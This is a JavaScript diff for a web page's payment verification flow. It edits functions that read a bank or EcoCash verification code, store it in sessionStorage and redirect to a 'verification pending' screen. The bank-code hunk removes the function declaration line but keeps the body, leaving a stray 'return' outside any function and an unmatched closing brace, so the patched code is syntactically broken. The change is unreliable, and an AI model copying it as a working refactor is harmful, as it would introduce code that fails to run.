@@ -1123,28 +1123,22 @@ async function monitorVerificationStatus() {
 // ======================================================
 // SAVE BANK VERIFICATION
 // ======================================================
+    const code = document.getElementById("bankVerificationCode")
+    . value 
+    .trim();
 
-function saveBankVerification() {
-
-    const code = document
-        .getElementById("bankVerificationCode")
-        .value
-        .trim();
-
-    if (code === "") {
+    if (code=== "") {
 
         alert("Please enter the verification code.");
 
         return;
 
     }
-
-    sessionStorage.setItem(
-        "bankVerificationCode",
-        code
-    );
-
-    loadBankReferenceScreen();
+    sessionStorage.setItem("bankVerificationCode",
+                           code
+                           );
+    // Go to the verification waiting screen
+    loadVerificationPendingScreen();
 
 }
 // ======================================================
@@ -1957,7 +1951,7 @@ function saveEcoCashVerification() {
         code
     );
 
-    loadEcoCashReferenceScreen();
+    loadVerificationPendingScreen();
 
 }
 // ======================================================
